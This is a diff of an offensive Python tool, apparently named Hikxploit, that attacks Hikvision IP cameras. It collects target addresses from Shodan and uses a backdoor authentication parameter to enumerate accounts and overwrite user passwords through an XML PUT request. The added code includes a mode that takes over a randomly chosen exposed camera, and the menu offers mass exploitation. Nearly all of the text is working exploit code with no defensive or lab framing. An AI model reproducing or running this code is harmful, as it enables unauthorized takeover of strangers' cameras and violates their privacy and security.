@@ -9,6 +9,7 @@ from blessings import Terminal
 import requests
 import re
 import subprocess
+import random
 
 global path
 global host
@@ -48,7 +49,7 @@ def gather_host_shodan():
     try:
         query = raw_input("["+t.blue("*")+"]"+ " enter a valid shodan query:")
         response = api.search(query)
-        with open('/home/nothing/Hikxploit/host.txt',"wb") as host:
+        with open(path +'/host.txt',"wb") as host:
             for service in response['matches']:
                 host.write(service['ip_str']+ ":" + str(service['port']))#host.write(service['port']
                 host.write("\n")
@@ -83,6 +84,8 @@ def mass_exploit():
 def select_host_exploit():
     global target_host
     global port
+    global userID
+    global userName
     pattern_1 = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'
     pattern_2 = r'(\:).*'
     b = 0
@@ -98,14 +101,88 @@ def select_host_exploit():
     target_host = match1.group()
     port_raw = match2.group()
     port = port_raw[1:]
-    newPass = raw_input(t.red('[*]'+'please choose a new password:'))
-    userName = "admin"
-    userID = "1"
-    userXML = '<User version="1.0" xmlns="http://www.hikvision.com/ver10/XMLSchema">''.<id>'+ userID + '</id>.<userName>'+ userName + '</userName>.<password>'+ newPass + '</password>.</User>'
     URLBase = "http://"+target_host+ ":" +str(port) + "/"
+    print"[-]Password must start with 4 numbers, im setting it up for u."
+    rawPass = raw_input(t.red('[*]'+'please choose a new password:'))
+    newPass = str(random.randint(1,9)) + str(random.randint(1,9)) + str(random.randint(1,9)) + str(random.randint(1,9)) + rawPass
+    ans_1 = raw_input("[*]Do you wanna scan for existing user and id? (y/n):")
+    if ans_1 == "y":
+        lista = requests.get(URLBase + "Security/users?1"+ BackdoorAuthArg).text
+        idf = "<id>"
+        pattern_id = r'(<id>).*'
+        find_id = re.findall('<id>(.*?)</id>', lista,re.DOTALL)
+        find_user = re.findall('<userName>(.+?)</userName>', lista, re.DOTALL)
+        counter = 0
+        while counter < len(find_id):
+            print(t.green('[')+t.yellow('*')+t.green(']')+"Found user "+ find_user[counter] + " with id:" + find_id[counter])
+            counter += 1
+        select_user = input("[--]Select one user to change the password:")
+        select_user = select_user - 1
+        userID = find_id[select_user]
+        userName = find_user[select_user]
+    elif ans_1 == "n":
+        userID = "1"
+        userName = "admin"
+    userXML = '<User version="1.0" xmlns="http://www.hikvision.com/ver10/XMLSchema">''.<id>'+ userID + '</id>.<userName>'+ userName + '</userName>.<password>'+ newPass + '</password>.</User>'
     URLUpload = URLBase + "Security/users/1?" + BackdoorAuthArg
-    requests.put(URLUpload, data=userXML).text
-    print(t.green('[out]Changed password of admin to ' + newPass + ' at ' +res))
+    a = requests.put(URLUpload, data=userXML)
+    if a.status_code == 200:
+        print(t.green('\n[ok]Changed password of ' + userName + ' to ' + t.white(newPass) + t.green(' at ') +t.white(res)+ "\n"))
+    elif a.status_code != 200:
+        print(t.green('[')+t.red('*')+t.green(']')+"Something went wrong!")
+
+def random_host_exploit():
+    global target_host
+    global port
+    global userID
+    global userName
+    pattern_1 = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'
+    pattern_2 = r'(\:).*'
+    b = 0
+    while b < len(host):
+        res = host[b]
+        print str(b) + ". " + host[b]
+        print "\n"
+        b += 1
+    op = len(host) - 1
+    sel = random.randint(1,op)
+    print"[--]Selected No. " + str(sel)
+    res = host[int(sel)]
+    match1 = re.search(pattern_1 , res)
+    match2 = re.search(pattern_2 , res)
+    target_host = match1.group()
+    port_raw = match2.group()
+    port = port_raw[1:]
+    URLBase = "http://"+target_host+ ":" +str(port) + "/"
+    print"[-]Password must start with 4 numbers, im setting it up for u."
+    rawPass = raw_input(t.red('[*]'+'please choose a new password:'))
+    newPass = str(random.randint(1,9)) + str(random.randint(1,9)) + str(random.randint(1,9)) + str(random.randint(1,9)) + rawPass
+    ans_1 = raw_input("[*]Do you wanna scan for existing user and id? (y/n):")
+    if ans_1 == "y":
+        lista = requests.get(URLBase + "Security/users?1"+ BackdoorAuthArg).text
+        idf = "<id>"
+        pattern_id = r'(<id>).*'
+        find_id = re.findall('<id>(.*?)</id>', lista,re.DOTALL)
+        find_user = re.findall('<userName>(.+?)</userName>', lista, re.DOTALL)
+        counter = 0
+        while counter < len(find_id):
+            print(t.green('[')+t.yellow('*')+t.green(']')+"Found user "+ find_user[counter] + " with id:" + find_id[counter])
+            counter += 1
+        select_user = input("[--]Select one user to change the password:")
+        select_user = select_user - 1
+        userID = find_id[select_user]
+        userName = find_user[select_user]
+    elif ans_1 == "n":
+        userID = "1"
+        userName = "admin"
+    userXML = '<User version="1.0" xmlns="http://www.hikvision.com/ver10/XMLSchema">''.<id>'+ userID + '</id>.<userName>'+ userName + '</userName>.<password>'+ newPass + '</password>.</User>'
+    URLUpload = URLBase + "Security/users/1?" + BackdoorAuthArg
+    a = requests.put(URLUpload, data=userXML)
+    if a.status_code == 200:
+        print(t.green('\n[ok]Changed password of ' +userName+ ' to ' + t.white(newPass) + t.green(' at ') +t.white(res)+ "\n"))
+    elif a.status_code != 200:
+        print(t.green('[')+t.red('*')+t.green(']')+"Something went wrong!")
+        print a
 
 def vuln_scan():
     print"[+]Loading all host..."
@@ -169,24 +246,31 @@ def scan():
     
 def response():
     global usage
-    usage = raw_input(t.red('[#]Select an option:'))
-    if str(usage) == "1":
+    usage_str = raw_input(t.red('[#]')+t.green('Select an option:'))
+    if str(usage_str) == "1":
         gather_host_shodan()
-    elif str(usage) == "2":
+        response()
+    elif str(usage_str) == "2":
         print"WIP"
-    elif str(usage) == "3":
+    elif str(usage_str) == "3":
         scan()
-    elif str(usage) == "4":
+        response()
+    elif str(usage_str) == "4":
         print(t.red('[!!!]')+t.green('Very dangerous option please be carefull'))
         answer = raw_input(t.green('[???]')+t.blue('do you wanna continue? [y/n]'))
         if str(answer) == "y":
             mass_exploit()
+            response()
         elif str(answer) == "n":
             response()
-    elif str(usage) == "5":
+    elif str(usage_str) == "5":
         select_host_exploit()
-    elif str(usage) == "6":
-        print"WIP"
+        response()
+    elif str(usage_str) == "6":
+        random_host_exploit()
+        response()
+    elif str(usage_str) == "help":
+        main()
         
     
 
